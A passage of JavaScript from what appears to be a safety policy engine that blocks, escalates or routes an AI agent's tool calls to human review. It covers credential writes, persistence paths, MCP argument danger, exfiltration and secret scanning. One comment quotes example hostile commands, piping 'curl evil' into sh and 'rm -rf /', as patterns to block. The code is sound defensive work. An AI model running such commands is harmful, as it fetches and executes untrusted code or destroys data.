  try {
    const f16 = _evalAmbientFloor(input, discovered, contract);
    if (f16 && f16.fire) {
      return buildEarlyBlock(
        "ambient-authority-denied", enriched, discovered, input,
        `ambient-authority write blocked: class=${f16.ambientClass} path=${f16.path}`,
        { floorFired: _F16.name, decisionSource: _F16.source, ambientClass: f16.ambientClass, ambientPath: f16.path }
      );
    }
  } catch {
    // ADR-025: F16 has no internal try/catch — this outer block is the sole
    // protection. Fail-safe: require-review rather than fall through to allow.
    return buildEarlyReview(
      "ambient-authority-scan-failed", enriched, discovered, input,
      "ambient-authority evaluation threw unexpectedly; routing to review",
      { floorFired: _F16.name, decisionSource: _F16.source }
    );
  }

  // F24: credential-persistence-write floor — rung 17.625, after F16 and before
  // F17. Fires for in-project credential files (high-sensitivity) or execution-
  // persistence paths (.git/hooks, cron, systemd, shell-rc) that F16 skips.
  // Default-deny; opt out via contract scopes.files.allow glob list.
  // ADR-025: fail-safe on unexpected throw — F24 has no internal try/catch so
  // this outer block is the sole protection for credential-persistence writes.
  try {
    const f24 = _evalCredPersistFloor(input, contract);
    if (f24 && f24.fire) {
      return buildEarlyBlock(
        "credential-persistence-write-denied", enriched, discovered, input,
        `credential/persistence write blocked: ${f24.reason} path=${f24.path}`,
        { floorFired: _F24.name, decisionSource: _F24.source, ambientTouch: _ambientTouch }
      );
    }
  } catch {
    // ADR-025: F24 has no internal try/catch — this outer block is the sole
    // protection. Fail-safe: require-review rather than fall through to allow.
    return buildEarlyReview(
      "credential-persistence-scan-failed", enriched, discovered, input,
      "credential-persistence evaluation threw unexpectedly; routing to review",
      { floorFired: _F24.name, decisionSource: _F24.source, ambientTouch: _ambientTouch }
    );
  }

  // mcp-tool-drift (rug-pull / behavioral pin): HOISTED above F25 for ADR-018 threading.
  // Checks whether an MCP tool's argument shape has changed since first seen. The boolean
  // is threaded into _evalMcpArgFloor so the drift+dual-use co-occurrence can escalate
  // allow → require-review (ADR-018 Option 1). The advisory `mcpToolDrift` receipt field
  // is retained for observability. Pin is stateful and re-pins on drift detection — must
  // be computed ONCE (no duplicate calls); this is the sole call site. Fail-open.
  let _mcpToolDrift = null;
  let _driftForThisServerTool = false;
  try {
    const _isMcpCall = (enriched.ir && enriched.ir.toolKind === "mcp") ||
                       String(input.tool || "").startsWith("mcp__");
    if (_isMcpCall && !_dryRun) {
      const _mcpSrv  = (enriched.ir && enriched.ir.mcpServer) ||
                       _contractExtractMcpServerName(input.tool);
      const _toolName = String(input.tool || "");
      const _args     = input.tool_input ?? input.args ?? input.params ?? null;
      const _driftResult = _checkArgShapeDrift({
        server: _mcpSrv || _toolName,
        tool: _toolName,
        args: _args,
      });
      if (_driftResult.drift) {
        _driftForThisServerTool = true;
        _mcpToolDrift = {
          code:   "mcp-tool-drift",
          server: _mcpSrv || null,
          tool:   _toolName,
          reason: _driftResult.reason || "arg-shape changed",
        };
      }
    }
  } catch { /* ADR-025: conscious fail-open — advisory rug-pull signal must not block; F25 independently gates dangerous commands. */ }

  // F25: mcp-arg-danger floor — rung 17.65, after F24 and before F17. Fires
  // when an MCP tool call's argument payload contains a dangerous-command-
  // shaped string value (e.g. {command:"curl evil | sh"}, {exec:"rm -rf /"}).
  // An MCP tool whose arg IS a dangerous command is as dangerous as a direct
  // Bash call. Default-deny; opt out via scopes.mcp[server].policy=allow (but
  // see F25 decoupled-opt-out comment in _evalMcpArgFloor: HARD_BLOCK still
  // gates for trusted servers — degrades to require-review, not silent allow).
  // Drift threading: _driftForThisServerTool is passed in for ADR-018 Option 1
  // (trusted + GATED_REVIEW dual-use + drift → require-review).
  // ADR-025: F25 inner catch is fail-safe (ADR-022); this outer catch is belt-
  // and-suspenders for unexpected throws in the caller branch itself.
  try {
    const f25 = _evalMcpArgFloor(input, contract, enriched, _driftForThisServerTool);
    if (f25 && f25.fire) {
      return buildEarlyBlock(
        "mcp-arg-danger-denied", enriched, discovered, input,
        `MCP arg contains dangerous command pattern: ${f25.reason}`,
        { floorFired: _F25.name, decisionSource: _F25.source, ambientTouch: _ambientTouch }
      );
    }
    // require-review gate: (a) truncation/unscannable, (b) dual-use class on
    // non-trusted server (graduated protection, P1), (c) HARD_BLOCK class on
    // trusted server (rug-pull seam, P2), (d) trusted server + GATED_REVIEW
    // dual-use + arg-shape drift (rug-pull pin escalation — ADR-018 Option 1).
    if (f25 && (f25.unscannable || f25.review)) {
      const reasonCode = f25.unscannable ? "mcp-arg-shape-unscannable" : "mcp-arg-danger-review-required";
      return buildEarlyReview(
        reasonCode, enriched, discovered, input,
        f25.unscannable
          ? `MCP arg payload too complex to fully scan: ${f25.reason}`
          : `MCP arg contains command requiring review: ${f25.reason}`,
        { floorFired: _F25.name, decisionSource: _F25.source, ambientTouch: _ambientTouch }
      );
    }
  } catch {
    // ADR-025: belt-and-suspenders — if the caller branch throws after the
    // floor returns (e.g. in buildEarlyBlock/buildEarlyReview), fail-safe.
    return buildEarlyReview(
      "mcp-arg-scan-failed", enriched, discovered, input,
      "MCP arg evaluation threw unexpectedly in caller; routing to review",
      { floorFired: _F25.name, decisionSource: _F25.source, ambientTouch: _ambientTouch }
    );
  }

  // F26: mcp-registration-write floor — rung 17.6875, after F25 and before
  // F17. Content-aware second line after F16 (ambient-authority). Fires when
  // a file-write to an MCP config path registers a server with a dangerous-
  // command-shaped launch command. Fires even when F16 has been opted out via
  // scopes.ambient.allow. Default-deny; opt out via scopes.files.allow.
  // ADR-025: F26 inner catch is fail-safe (ADR-022); this outer catch is belt-
  // and-suspenders for unexpected throws in the caller branch itself.
  try {
    const f26 = _evalMcpRegistrationFloor(input, contract);
    if (f26 && f26.fire) {
      return buildEarlyBlock(
        "mcp-registration-write-denied", enriched, discovered, input,
        `MCP config write registers server with dangerous command: ${f26.reason}`,
        { floorFired: _F26.name, decisionSource: _F26.source, ambientTouch: _ambientTouch }
      );
    }
    if (f26 && f26.unscannable) {
      return buildEarlyReview(
        "mcp-config-unscannable", enriched, discovered, input,
        `MCP config content too complex to fully scan: ${f26.reason}`,
        { floorFired: _F26.name, decisionSource: _F26.source, ambientTouch: _ambientTouch }
      );
    }
  } catch {
    // ADR-025: belt-and-suspenders — if the caller branch throws after the
    // floor returns (e.g. in buildEarlyBlock/buildEarlyReview), fail-safe.
    return buildEarlyReview(
      "mcp-config-scan-failed", enriched, discovered, input,
      "MCP config evaluation threw unexpectedly in caller; routing to review",
      { floorFired: _F26.name, decisionSource: _F26.source, ambientTouch: _ambientTouch }
    );
  }

  // (mcp-tool-drift computed and threaded above, before F25 — see ADR-018 threading note)

  // F17 PR-A: cross-agent-lock floor — rung 17.75, after F16 and before
  // contract-allow demotion. Fires when a write-like call targets a
  // path/project already held by a different agent's lock that is not
  // expired. Non-demotable. Fail-CLOSED for write-like when lock state is
  // malformed (`state.ok=false`).
  // ADR-025: fail-safe on unexpected throw — F17 fails CLOSED for malformed lock
  // state; consistent outer behaviour requires fail-safe on any unexpected throw.
  try {
    const f17 = _evalCrossAgentLockFloor(input, discovered, enriched);
    if (f17 && f17.fire) {
      const detail = f17.reason === "lock-state-malformed"
        ? "lock state malformed — failing closed"
        : `lock owner=${f17.lockOwner || ""} project=${f17.lockProject || ""}`;
      return buildEarlyBlock(
        "cross-agent-lock-denied", enriched, discovered, input,
        `cross-agent lock blocked: ${detail}`,
        {
          floorFired: _F17.name,
          decisionSource: _F17.source,
          ambientTouch: _ambientTouch,
          lockOwner: f17.lockOwner,
          lockPath: f17.lockPath,
          lockProject: f17.lockProject,
          lockExpiresAt: f17.lockExpiresAt,
        }
      );
    }
  } catch {
    // ADR-025: F17 internally fails CLOSED for malformed lock state; an unexpected
    // throw from the floor itself must not silently allow. Fail-safe.
    return buildEarlyReview(
      "cross-agent-lock-scan-failed", enriched, discovered, input,
      "cross-agent-lock evaluation threw unexpectedly; routing to review",
      { floorFired: _F17.name, decisionSource: _F17.source, ambientTouch: _ambientTouch }
    );
  }

  // F19 (ADR-010): output-channel-exfiltration floor — rung 17.875, after F17
  // and before the contract-allow demotion rung (18). Two paths:
  //
  //   - `confirmed` severity → early-block via buildEarlyBlock(). Non-demotable
  //     in the lattice (only `operator-token-suspicious-only` is listed in
  //     demotableBy, and that path is severity-gated below).
  //   - `suspicious` severity OR `compensating` (PreToolUse on a not-observed
  //     channel) → set action/source/floorFired so the rest of the engine flow
  //     sees `require-review`. Demotable to `allow` only by a one-shot scoped
  //     operator token (scope: `output-exfil-review-demote`); contract-allow
  //     cannot demote because action becomes `require-review` BEFORE the
  //     contract-allow check fires.
  //
  // Receipt enrichment fields (outputChannel, matchClasses, redactedSample,
  // compensatingRestrictionApplied) ride on `_f19Detail` and are spread into
  // both the final result + journal append below.
  let _f19Detail = null;
  let _f19PreviewAction = null; // pre-decision action when F19 fires non-block
  let _f19PreviewSource = null;
  try {
    const f19 = _evalF19Floor(input);
    if (f19 && f19.fire) {
      const matchClasses = (f19.matches || [])
        .map((m) => (m && typeof m.class === "string" ? m.class : null))
        .filter((c) => c != null);
      const baseDetail = {
        outputChannel: f19.channel,
        matchClasses,
        redactedSample: typeof f19.redactedSample === "string" ? f19.redactedSample : "",
        compensatingRestrictionApplied: Boolean(f19.compensatingApplied),
        compensatingRestriction: f19.compensatingRestriction || null,
        channelObservability: f19.channelObservability,
        severity: f19.severity,
        phase: f19.phase,
      };

      if (f19.severity === "confirmed") {
        return buildEarlyBlock(
          "output-exfil-denied", enriched, discovered, input,
          `output-channel exfiltration blocked: channel=${f19.channel} severity=confirmed classes=${matchClasses.join(",")}`,
          {
            floorFired: _F19.name,
            decisionSource: _F19.source[0],
            ambientTouch: _ambientTouch,
            f19Detail: baseDetail,
          }
        );
      }

      // Severity is `suspicious` or `compensating`.
      // Attempt operator-token demotion only when the LATTICE demotableBy
      // explicitly authorizes it for this severity. `compensating` requires
      // a declared compensatingRestriction to be eligible.
      const tokenEnv = process.env.LILARA_F19_DEMOTE_TOKEN || "";
      let demoted = false;
      const demotionLatticed = canDemote(_F19.id, _DEMOTE_F19_SUSPICIOUS);
      const severityEligible =
        f19.severity === "suspicious" ||
        (f19.severity === "compensating" && f19.compensatingRestriction);
      if (tokenEnv && demotionLatticed && severityEligible) {
        try {
          demoted = _contractConsumeScopedOperatorToken(tokenEnv, _DEMOTE_F19_TOKEN_SCOPE);
        } catch { /* token mech unavailable → fail closed (no demotion) */ }
      }
      if (demoted) {
        // Demotion path: result is allow, receipt records the override.
        // _F19.source[1] is the LATTICE-anchored demoted-variant tag.
        _f19PreviewAction = "allow";
        _f19PreviewSource = _F19.source[1];
        _f19Detail = { ...baseDetail, demoted: true };
      } else {
        _f19PreviewAction = "require-review";
        _f19PreviewSource = _F19.source[0];
        _f19Detail = { ...baseDetail, demoted: false };
      }
    }
  } catch {
    // ADR-025: output-exfil evaluation threw unexpectedly. Fail-safe: a scanner
    // failure must not blind the engine to an active exfil channel. Route to
    // require-review so the call is not silently permitted.
    return buildEarlyReview(
      "output-exfil-scan-failed", enriched, discovered, input,
      "output-channel exfil evaluation threw unexpectedly; routing to review",
      { floorFired: _F19.name, decisionSource: _F19.source[0], ambientTouch: _ambientTouch }
    );
  }

  // F20 (ADR-012): change-intent drift — rung 18.5. Compares the declared-
  // envelope (envelope.declaredIntent) against the canonical Action IR built
  // by adapters. Engine wiring sits between F19's evaluation and the contract-
  // allow demotion block; the action override is applied later (after F14b)
  // so contract-allow / auto-allow-once / trajectory-nudge cannot silently
  // undo a `high` block or `medium` require-review.
  //
  // Envelope source priority: input.envelope.declaredIntent (test/harness-
  // supplied) takes precedence over the on-disk envelope file loaded via
  // runtime/envelope.loadDeclaredEnvelope(). File-read failures fail-open and
  // are journaled via the `journalError` callback below.
  let _changeIntent = null;          // receipt payload (always present once evaluated)
  let _f20PreviewAction = null;      // pre-decision action when F20 fires non-block
  let _f20PreviewSource = null;
  try {
    let declaredEnv = null;
    const harnessEnv = input.envelope && typeof input.envelope === "object" ? input.envelope : null;
    if (harnessEnv && harnessEnv.declaredIntent) {
      declaredEnv = harnessEnv;
    } else {
      const loaded = _loadDeclaredEnvelope({
        journalError: (code, msg) => {
          try {
            append({ kind: "change-intent-envelope-error", error: `${code}:${String(msg).slice(0, 120)}` });
          } catch { /* journal best-effort */ }
        },
      });
      if (loaded && loaded.declaredIntent) declaredEnv = loaded;
    }

    const ir = input && input.ir;
    const declared = Boolean(declaredEnv && declaredEnv.declaredIntent);
    const diff = declared && ir
      ? _diffChangeIntent(declaredEnv, ir)
      : { drift: false, classes: [], details: [], severity: "none" };

    if (diff && diff.error) {
      try { append({ kind: "change-intent-helper-error", error: String(diff.error).slice(0, 120) }); } catch { /* best-effort */ }
    }

    // Build redacted-details snapshot — first 5 entries, value truncated to
    // 64 chars (the helper enforces both; this guards against shape drift).
    const redactedDetails = Array.isArray(diff && diff.details) && diff.details.length > 0
      ? diff.details.slice(0, 5).map((d) => ({
          class: typeof d.class === "string" ? d.class : "",
          value: typeof d.value === "string" ? d.value.slice(0, 64) : "",
        }))
      : null;

    _changeIntent = {
      declared,
      drift:    Boolean(diff && diff.drift),
      classes:  Array.isArray(diff && diff.classes) ? diff.classes.slice() : [],
      severity: diff && typeof diff.severity === "string" ? diff.severity : "none",
      redactedDetails,
    };

    if (declared && diff && diff.drift) {
      if (diff.severity === "high") {
        _f20PreviewAction = "block";
        _f20PreviewSource = _F20.source[0];
      } else if (diff.severity === "medium") {
        const tokenEnv = process.env.LILARA_F20_DEMOTE_TOKEN || "";
        let demoted = false;
        if (tokenEnv && canDemote(_F20.id, _DEMOTE_F20_MEDIUM)) {
          try {
            demoted = _contractConsumeScopedOperatorToken(tokenEnv, _DEMOTE_F20_TOKEN_SCOPE);
          } catch { /* token mech unavailable → fail closed (no demotion) */ }
        }
        if (demoted) {
          _f20PreviewAction = "allow";
          _f20PreviewSource = _F20.source[1];
        } else {
          _f20PreviewAction = "require-review";
          _f20PreviewSource = _F20.source[0];
        }
      }
      // severity === "low" → receipt-only marker, no action override.
    }
  } catch (err) {
    // F20 must never throw out to the engine. Journal the error and leave
    // _changeIntent at null (no receipt enrichment) / no action override.
    try { append({ kind: "change-intent-engine-error", error: String((err && err.message) || err).slice(0, 120) }); }
    catch { /* journal best-effort */ }
  }

  const learnedAllow = isLearnedAllowed(enriched);
  const risk = score(enriched);
  const policyKey = fineKey(enriched);
  let action = "allow";
  let source = _F3.source; // baseline "risk-engine" — derived from LATTICE.F3.source
  // floorFired holds the LATTICE entry name of the first floor that fired
  // (string written into the receipt + journal). canDemote() lookups in this
  // function use the corresponding LATTICE id; the two stay in sync because
  // every assignment below routes through a _Fx.name read.
  let floorFired = null;

  if (risk.level === "critical") {
    action = "block";
    floorFired = _F3.name;
  } else if (risk.level === "high" && risk.reasons.includes("protected-branch")) {
    // Floor: protected-branch write always requires review; contract-allow cannot demote it (B4).
    action = "require-review";
    floorFired = _F8.name;
  } else if (risk.level === "high" && risk.reasons.includes("destructive-delete-pattern")) {
    // Learned-allow is permitted only for the destructive-delete-pattern case at high risk.
    action = learnedAllow ? "allow" : "require-tests";
  } else if (risk.level === "high") {
    action = "escalate";
  } else if (risk.level === "medium" && risk.reasons.includes("sensitive-target-path")) {
    // B2: sensitive-target medium risk is NOT demotable by learned-allow.
    action = "modify";
  } else if (risk.level === "medium") {
    // B2: generic medium risk is NOT demotable by learned-allow.
    action = "route";
  } else {
    action = "allow";
  }

  // Learned-allow source: only when it actually demoted a destructive-delete-pattern hit.
  if (learnedAllow && risk.level === "high" && risk.reasons.includes("destructive-delete-pattern") && action === "allow") {
    source = _LA.source;
  }

  // F4 (D26 + ADR-002 B): secret-class-C payload floor — rung 4 in the precedence matrix.
  // Fires when payloadClass is explicitly C, OR when the command text contains a
  // class-C secret pattern (API key, credential, private key). Floor = block by default.
  // Cannot be demoted by contract-allow. payloadClass D does not exist in the schema.
  //
  // ADR-002 Option B: an operator can demote F4 from `block` to `require-review` for
  // legitimate inspection use cases (incident response, customer-data audit, security
  // investigation) by minting a one-shot scoped token and passing it via
  // LILARA_F4_DEMOTE_TOKEN. The token is single-use and scope-bound to
  // `class-c-review-demote`. Without a valid token, F4 stays a hard block.
  if (action !== "block") {
    const isClassC = (enriched.payloadClass || "A") === "C";
    let secretInCommand = false;
    if (!isClassC && _scanSecrets) {
      try {
        secretInCommand = Boolean(_scanSecrets(input.command || ""));
      } catch { /* secret-scan unavailable — skip */ }
      // Extend scan to MCP argument payloads — an mcp__ tool call whose args
      // contain a class-C secret (API key, token, private key) is hard-blocked
      // by F4 just like a command string carrying the same content.
      if (!secretInCommand && (enriched.ir?.toolKind === "mcp" || String(input.tool || "").startsWith("mcp__"))) {
        try {
          // NEW (Task 3): if contract explicitly allows this MCP server, skip secret scan —
          // credential args are legitimate for trusted servers (DB connectors, secrets managers, etc.).
          const mcpSrv = enriched.ir?.mcpServer || _contractExtractMcpServerName(input.tool);
          if (_contractGetMcpPolicy(contract, mcpSrv) !== "allow") {
            const mcpPayload = JSON.stringify(input.tool_input ?? input.args ?? input.params ?? "");
            secretInCommand = Boolean(_scanSecrets(mcpPayload));
            // policy === "allow" → server explicitly trusted; credential args legitimate, skip scan
          }
        } catch { /* scan or serialize unavailable — skip */ }
      }
    }
    if (isClassC || secretInCommand) {
      // ADR-002 Option B: demotion authorization is the LATTICE.F4.demotableBy
      // gate via canDemote(F4.id, operator-token:class-c-review-demote). Token
      // presence is necessary but not sufficient — canDemote() is the sole
      // arbiter so future drift cannot bypass the lattice.
      let f4DemoteAllowed = false;
      const demoteToken = process.env.LILARA_F4_DEMOTE_TOKEN || "";
      // ADR-004 PR 37B: in degraded mode the F4 operator-token demotion is
      // suppressed entirely — F4 stays a hard block even with a valid token.
      // Token is not consumed (so the operator does not waste it during an
      // incident); clearing degraded mode lets the next decide() honor it.
      if (demoteToken && canDemote(_F4.id, _DEMOTE_F4_OPERATOR_TOKEN) && !_degradedState.degraded) {
        try {
          f4DemoteAllowed = _contractConsumeScopedOperatorToken(demoteToken, "class-c-review-demote");
        } catch { /* token mech unavailable — fail closed (no demotion) */ }
      }
      if (f4DemoteAllowed) {
        action = "require-review";
        // F4.source is ["secret-class-C", "f4-class-c-demoted"]; element 1 is
        // the demoted variant per LATTICE.F4.
        source = _F4.source[1];
        floorFired = floorFired || _F4.name;
      } else {
        action = "block";
        floorFired = floorFired || _F4.name;
      }
    }
  }

  // F10 (A2): taint floor — command overlaps with recently-read external content.
  // Fires at rung 8.5 (after protected-branch, before session-risk). Forces
  // require-review so the operator can confirm the command was not injected.
  // Best-effort: if taint module unavailable, skip silently.
  let taintResult = null;
  if (_correlateCommand) {
    try {
      taintResult = _correlateCommand(input.command || "", undefined, input.tool || "");
      if (taintResult.tainted && action !== "block") {
        action = "require-review";
        source = _F10.source;
        floorFired = floorFired || _F10.name;
      }
    } catch (taintErr) {
      if (!_taintWarnedOnce) {
        _taintWarnedOnce = true;
        try { append({ kind: "taint-floor-disabled", error: String(taintErr && taintErr.message || taintErr) }); } catch { /* journal is best-effort */ }
      }
    }
  } else if (!_taintWarnedOnce) {
    _taintWarnedOnce = true;
    try { append({ kind: "taint-floor-disabled", error: "module not found" }); } catch { /* journal is best-effort */ }
  }

  // F9 (B3): session-risk >= 3 — true floor. Escalate unconditionally before
  // contract-allow can demote (the demotion path below routes through canDemote).
  if (enriched.sessionRisk >= 3 && action !== "block" && action !== "escalate") {
    action = "escalate";
    source = _F9.source;
    floorFired = floorFired || _F9.name;
  }

  // F6 (D26): posture-strict-no-cover floor — rung 6 in the precedence matrix.
  // Fires when trust posture is strict AND the command class is gated AND
  // scopeMatch did not cover it (contractAllow=false, no operator-signal bypass).
  // Trigger: trustPosture === "strict" + isGated + !contractAllow. Floor = block.
  // Does NOT fire in balanced or relaxed posture — locked semantic per D26.
  if (action !== "block" && isGated && !contractAllow && enriched.trustPosture === "strict") {
    action = "block";
    source = _F6.source;
    floorFired = floorFired || _F6.name;
  }

  // F7 (D26 + ADR-001 D): intent-unknown-strict floor — rung 7 in the precedence matrix.
  // Fires when the intent classifier returns "unknown" AND trust posture is strict.
  // A command the classifier cannot recognize is inherently higher-risk in strict
  // mode — no contract scope can cover what the engine cannot categorise.
  // Trigger: intentResult.intent === "unknown" + trustPosture === "strict".
  // Action: require-review (operator must approve before execution).
  // Does NOT fire in balanced or relaxed posture — locked semantic per D26.
  // ADR-001 D: changed from "block" to "require-review" so descriptive commands
  // ("update module", "edit file") in strict mode prompt for review instead of
  // killing the work outright. Block remains for genuinely critical risk via
  // earlier rungs (kill-switch, critical-risk, etc.).
  if (action !== "block" && action !== "require-review" && intentResult.intent === "unknown" && enriched.trustPosture === "strict") {
    action = "require-review";
    source = _F7.source;
    floorFired = floorFired || _F7.name;
  }

  // Step 11: contract-allow — demotes baseline only; never demotes hard floors.
  // B4: protects require-review (protected-branch floor) from demotion.
  // W11: tool-allow reason permits escalate demotion. When an active F9
  // (session-risk-floor) is the escalating floor, the demotion routes through
  // canDemote(F9.id, contract-allow:tool-allow-*) so LATTICE.F9.demotableBy is
  // the sole arbiter. Non-F9 escalates (baseline risk-engine high-risk)
  // preserve the original W11 carve-out without consulting canDemote (no floor
  // to authorize against).
  const _attemptedF9DemoteSource = contractReason === "tool-allow-matched"
    ? _DEMOTE_F9_TOOL_ALLOW_MATCHED
    : contractReason === "tool-allow-tool-scope"
      ? _DEMOTE_F9_TOOL_ALLOW_SCOPE
      : null;
  const _isF9Escalate = floorFired === _F9.name;
  const _canDemoteF9 = _isF9Escalate && _attemptedF9DemoteSource != null &&
    canDemote(_F9.id, _attemptedF9DemoteSource);
  const _canDemoteBaselineEscalate = !_isF9Escalate &&
    (contractReason === "tool-allow-matched" || contractReason === "tool-allow-tool-scope");
  const canDemoteEscalate = contractAllow && (_canDemoteF9 || _canDemoteBaselineEscalate);
  if (contractAllow &&
      risk.level !== "critical" &&
      action !== "block" &&
      action !== "require-review" &&
      (action !== "escalate" || canDemoteEscalate)) {
    action = "allow";
    source = contractReason === "tool-allow-tool-scope" ? _CA.source[1] : _CA.source[0];
    // F9-demoted state — receipt reflects via source, clear the floor stamp.
    if (_canDemoteF9) floorFired = null;
  }

  // ADR-004 PR 37B: skip auto-allow-once consumption entirely when we are
  // degraded + write-like; the write-like override below would flip the
  // resulting allow→require-review anyway, and consuming the token here
  // would waste it during the incident the operator is investigating.
  if (
    source !== _LA.source &&
    !source.startsWith("contract-allow") &&
    risk.level !== "critical" &&
    risk.level !== "high" &&
    action !== "allow" &&
    hasAutoAllowOnce(scopedKey(enriched)) &&
    !(_degradedState.degraded && _writeLike)
  ) {
    // L6: auto-allow-once is granted and consumed under the PROJECT-SCOPED key
    // (matching where the operator's grant was stored), not the unscoped
    // human-readable receipt policyKey. scopedKey(enriched) is memoized via
    // projectScope/safeGit and only evaluated after the cheaper guards above.
    consumeAutoAllowOnce(scopedKey(enriched));
    action = "allow";
    source = _AAO.source;
  }

  const trajectory = getSessionTrajectory();
  const trajectoryThreshold = Number(process.env.LILARA_TRAJECTORY_THRESHOLD || "3");
  let trajectoryNudge = null;
  // Trajectory-nudge applies to baseline risk-engine decisions only. Floor-derived
  // sources (intent-unknown-strict, taint-floor, session-risk-floor, f4-class-c-demoted,
  // posture-strict-no-cover, etc.) are explicit policy decisions that already encode
  // the right severity for their trigger condition; nudging them further would compound
  // the escalation. ADR-001 D made this matter for F7 (was block, now require-review);
  // ADR-002 B made it matter for F4 demotion path. The contract-allow / learned-allow /
  // auto-allow-once exclusions are preserved (those are demotions, not floors).
  if (source === _F3.source && trajectory.recentEscalations >= trajectoryThreshold) {
    if (action === "allow") { action = "route"; trajectoryNudge = "allow\u2192route"; }
    else if (action === "route") { action = "require-review"; trajectoryNudge = "route\u2192require-review"; }
    else if (action === "require-review") { action = "escalate"; trajectoryNudge = "require-review\u2192escalate"; }
    if (trajectoryNudge) source = _TN.source;
  }

  // F14b: session-over-duration require-review escalation (D47).
  // Asserted AFTER all demotion blocks so contract-allow / auto-allow-once / trajectory-nudge
  // cannot silently undo it. Operator declared "after N minutes, stop and ask me" — same
  // pattern as F10 taint-floor: change action, not just annotate.
  if (sessionOverDuration) {
    action = "require-review";
    source = _F14b.source;
    floorFired = floorFired || _F14b.name;
  }

  // F19 (ADR-010): apply the suspicious / compensating override after F14b so
  // contract-allow / auto-allow-once / trajectory-nudge cannot silently undo
  // an F19-tagged require-review. Demoted-to-allow (via the operator token
  // consumed above) lands here too — but never weakens a stronger action that
  // a higher-priority floor (F3/F4/F8/F10/F14b/etc.) already wrote.
  if (_f19PreviewAction === "require-review") {
    if (action !== "block" && action !== "escalate") {
      action = "require-review";
    }
    source = _F19.source[0];
    floorFired = floorFired || _F19.name;
  } else if (_f19PreviewAction === "allow") {
    // Operator-token demoted F19 to allow. Preserve any stronger action that
    // an unrelated higher-priority floor produced (block/require-review/etc.).
    if (
      action !== "block" &&
      action !== "require-review" &&
      action !== "escalate" &&
      action !== "require-tests"
    ) {
      action = "allow";
      source = _F19.source[1];
    }
    floorFired = floorFired || _F19.name;
  }

  // F20 (ADR-012): change-intent drift override. Applied AFTER F14b + F19
  // so contract-allow / auto-allow-once / trajectory-nudge cannot silently
  // undo a high-severity block or a medium-severity require-review. A
  // medium-severity demoted-to-allow path never weakens a stronger action
  // an unrelated higher-priority floor already produced.
  if (_f20PreviewAction === "block") {
    action = "block";
    source = _F20.source[0];
    floorFired = floorFired || _F20.name;
  } else if (_f20PreviewAction === "require-review") {
    if (action !== "block" && action !== "escalate") {
      action = "require-review";
    }
    source = _F20.source[0];
    floorFired = floorFired || _F20.name;
  } else if (_f20PreviewAction === "allow") {
    if (
      action !== "block" &&
      action !== "require-review" &&
      action !== "escalate" &&
      action !== "require-tests"
    ) {
      action = "allow";
      source = _F20.source[1];
    }
    floorFired = floorFired || _F20.name;
  }

  // F23 (ADR-017): kill-chain late override — applied AFTER F20 so no demotion
  // path can undo it. In enforce mode only (LILARA_KILL_CHAIN_ENFORCE=1):
  //   - staged-exfil  → block  (never weakens block; replaces weaker actions)
  //   - injection-to-exec / persistence → escalate
  // In observe mode (default): action/source/floorFired are UNCHANGED — F23
  // is a true zero-impact path, adding only the killChain receipt field + coaching.
  if (_f23PreviewAction) {
    if (_f23PreviewAction === "block") {
      action = "block";
      source = _F23.source[0];
      floorFired = floorFired || _F23.name;
    } else if (_f23PreviewAction === "escalate") {
      if (action !== "block") {
        action = "escalate";
        source = _F23.source[0];
      }
      floorFired = floorFired || _F23.name;
    }
  }

  // ADR-004 PR 37B: degraded-mode write-like routing. When the journal hash
  // chain has failed verify (or LILARA_DEGRADED_MODE=1) AND this call is
  // write-like, any final `allow` is rerouted to `require-review`. Floors
  // that already produced require-review / escalate / block are preserved
  // verbatim — degraded mode never widens an allow nor weakens an existing
  // gate. The receipt's `degradedMode.writeRouting` records the original
  // action so audit can reconstruct the override.
  let _degradedWriteRouted = null;
  if (_degradedState.degraded && _writeLike && action === "allow") {
    _degradedWriteRouted = source;
    action = "require-review";
  }
  // Final marker for receipt/journal — includes writeRouting when the
  // override fired so audit can tell the difference between "degraded
  // chain, write-like allow rerouted" and "degraded chain, action was
  // already require-review/block".
  const _degradedReceiptMarker = _degradedState.degraded
    ? _degradedMode.buildMarker(_degradedState, _degradedWriteRouted
        ? { writeRouting: "allow-to-require-review" }
        : null)
    : null;

  const pendingSuggestion = getSuggestionForInput(enriched);
  const policyFacts = getPolicyFacts(enriched);
  const promotionState = policyFacts.acceptedSuggestion || policyFacts.dismissedSuggestion || policyFacts.pendingSuggestion || null;
  const explanationParts = [
    `action=${action}`,
    `risk=${risk.level}:${risk.score}`,
    `source=${source}`,
  ];
  if (risk.reasons.length > 0) explanationParts.push(`reasons=${risk.reasons.join(",")}`);
  if (pendingSuggestion?.status === "pending") explanationParts.push(`suggestion=pending:${policyKey}`);
  if (learnedAllow && source === _LA.source) explanationParts.push("learned-allow=matched");
  if (source === _AAO.source) explanationParts.push("auto-allow-once=consumed");
  if (trajectoryNudge) explanationParts.push(`trajectory-nudge=${trajectoryNudge} (${trajectory.recentEscalations} recent escalations in session)`);
  if (projectPolicy.projectScope && projectPolicy.projectScope !== 'global') explanationParts.push(`project=${projectPolicy.projectScope}`);
  if (discovered.primaryStack) explanationParts.push(`stack=${discovered.primaryStack}`);
  if (discovered.hasConfig === false && discovered.primaryStack) explanationParts.push('config=missing');
  if (projectPolicy.trustPosture) explanationParts.push(`trust=${projectPolicy.trustPosture}`);
  if (intentResult.intent !== "unknown") explanationParts.push(`intent=${intentResult.intent}`);
  if (validityWarning) explanationParts.push("validity-warn=outside-window");
  if (mcpWarning)            explanationParts.push(`mcp-warn=${mcpWarning.name}`);
  if (_mcpToolDrift)         explanationParts.push(`mcp-tool-drift=${_mcpToolDrift.tool}`);
  if (skillWarning)          explanationParts.push(`skill-warn=${skillWarning.name}`);
  if (sessionDurationWarning) explanationParts.push(`session-over-duration=age:${sessionDurationWarning.ageMin}min/limit:${sessionDurationWarning.limitMin}min`);
  if (input.envelope?.hash) explanationParts.push(`envelope=${input.envelope.hash}`);
  // ADR-004 PR 37B: surface degraded-mode + write-routing in the explanation
  // so receipts on disk (and `horus doctor`) make the override visible.
  if (_degradedState.degraded) {
    explanationParts.push(`degraded-mode=${_degradedState.reason}`);
    if (_degradedWriteRouted) explanationParts.push("degraded-write-routed=allow→require-review");
  }
  // ADR-017 F23: surface kill-chain detection in explanation (observe or enforce).
  if (_f23Detail) {
    const _f23Tag = _f23Detail.enforced
      ? `kill-chain-enforced=${_f23Detail.chainType}`
      : `kill-chain-observed=${_f23Detail.chainType}`;
    explanationParts.push(_f23Tag);
  }

  const actionPlan = build(action, enriched, risk, discovered, policyFacts);
  const promotionGuidance = evaluate(policyFacts, risk);

